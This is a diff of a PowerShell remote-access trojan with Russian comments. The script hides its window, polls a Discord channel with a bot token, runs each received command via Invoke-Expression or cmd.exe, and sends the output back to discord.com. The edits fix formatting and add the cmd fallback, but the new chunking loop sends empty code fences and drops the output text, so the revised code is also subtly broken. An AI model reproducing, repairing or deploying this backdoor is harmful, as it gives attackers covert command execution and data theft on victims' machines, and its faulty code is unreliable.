@@ -1,12 +1,10 @@
 $token = "$tk"
 $chan  = "$ch"
-
-# =============================================================== SCRIPT SETUP =========================================================================
-$response = $null
-$previouscmd = $null
+$response = ""
+$previouscmd = ""
 $authenticated = 0
 
-# Скрытие окна — ИСПРАВЛЕНО (один -Name!)
+# --- Скрытие окна (корректно) ---
 $hide = 'y'
 if($hide -eq 'y'){
     $code = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
@@ -25,16 +23,18 @@ function PullMsg {
     } catch {}
 }
 
-# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
-# ЕДИНСТВЕННАЯ ПОЧИНЕННАЯ ФУНКЦИЯ — БОЛЬШЕ НИЧЕГО НЕ ТРОГАЛ
 function sendMsg {
     param([string]$Message)
     if(!$Message) { return }
-    $Message = $Message -replace '`', 'ˋ'          # фикс №1
+    $Message = $Message -replace '`', 'ˋ'         # discord-markdown escape
     $uri = "https://discord.com/api/v9/channels/$chan/messages"
     $boundary = [guid]::NewGuid().ToString()
     $LF = "`r`n"
-    $body = "--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$LF$({content=$Message}|ConvertTo-Json -Compress)$LF--$boundary--"
+    $payload = @{content=$Message}
+    $body = "--$boundary$LF" +
+        "Content-Disposition: form-data; name=`"payload_json`"$LF$LF" +
+        ($payload | ConvertTo-Json -Compress) + "$LF" +
+        "--$boundary--"
     try {
         Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "multipart/form-data; boundary=$boundary" -Body ([text.encoding]::UTF8.GetBytes($body)) -TimeoutSec 10 | Out-Null
     } catch {}
@@ -71,30 +71,42 @@ while ($true) {
                 continue
             }
 
-            # Выполнение команды (твой оригинальный код)
-            try { $out = Invoke-Expression $response 2>&1 | Out-String }
-            catch { $out = "$($_.Exception.Message)" }
+            # Исполнение команды
+            $out = ""
+            try {
+                $out = Invoke-Expression $response 2>&1 | Out-String
+            } catch {
+                $out = "$_"
+            }
+
+            # Если вывод пустой — пробуем через cmd (например, для "ipconfig", "ping" и др.)
+            if ([string]::IsNullOrWhiteSpace($out)) {
+                try {
+                    $out = cmd.exe /c $response 2>&1 | Out-String
+                } catch {
+                    $out = "$_"
+                }
+            }
 
             # Разбиваем на куски по 1900 символов
-            $batch = @()
-            $size = 0
-            foreach ($line in ($out -split "`n")) {
-                $bytes = [Text.Encoding]::Unicode.GetByteCount($line)
-                if ($size + $bytes -gt 1900) {
-                    sendMsg "``````$($batch -join "`n")``````"
-                    Start-Sleep -Milliseconds 400
-                    $batch = @(); $size = 0
+            $text = $out.Trim()
+            if (!$text) {
+                sendMsg ":white_check_mark: ``Command Sent`` :white_check_mark:"
+            } else {
+                $maxBatchSize = 1900
+                while($text.Length -gt 0) {
+                    $chunk = $text.Substring(0, [Math]::Min($maxBatchSize, $text.Length))
+                    sendMsg "``````"
+                    $text = $text.Substring([Math]::Min($maxBatchSize, $text.Length))
+                    Start-Sleep -Milliseconds 300
                 }
-                $batch += $line
-                $size += $bytes
             }
-            if ($batch) { sendMsg "``````$($batch -join "`n")``````" }
 
             sendMsg "``PS | $dir>``"
-        }
-        else {
+        } else {
             Authenticate
         }
     }
     Start-Sleep -Seconds 5
 }
+
